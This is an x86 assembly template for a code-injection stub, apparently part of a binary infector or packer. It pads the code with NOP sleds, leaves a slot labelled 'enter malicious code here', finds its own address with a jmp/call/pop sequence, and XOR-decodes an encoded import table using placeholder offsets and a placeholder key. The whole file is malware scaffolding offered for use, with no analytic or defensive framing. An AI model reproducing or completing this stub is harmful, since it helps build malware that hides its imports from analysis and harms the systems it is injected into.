global _start
  
section .text

_start:
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    
; -------------------------------------------
; enter malicious code here
; -------------------------------------------

; <OFFSET_TO_ORIGINAL_IMPORTS> - offset from first byte after resolver to first byte of original imports
; <OFFSET_TO_EXILED_IMPORTS>   - offset from first byte after resolver to first byte of exiled imports
; <DECODER_KEY>                - decoder key
; <IMPORTS_SIZE>               - size of imports
    
    jmp     store_current_address
    
get_current_addr:
    pop     esi                                 ; pop current address
    sub     esi, 0x5                            ; esi = address of injected code, 0x5 = size of call instruction
    mov     edi, esi                            ; edi = address of injected code
    sub     esi, <OFFSET_TO_ORIGINAL_IMPORTS>   ; esi = address of original imports
    add     edi, <OFFSET_TO_EXILED_IMPORTS>     ; edi = address of exiled imports
    
    xor     ebx, ebx                            ; clear registers
    xor     ecx, ecx                            ;
    
    mov     bl,  <DECODER_KEY>                  ; decoder key
    mov     ecx, <IMPORTS_SIZE>                 ; encoded code size

decoder_loop:
    mov     edx, esi                            ; construct encoded byte address
    add     edx, ecx                            ;
    dec     edx                                 ;
    xor     byte [edx], bl                      ; decode
    loop    decoder_loop                        ; loop back
    
store_current_address:
    call get_current_addr                       ; push return address
    
; -------------------------------------------
    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop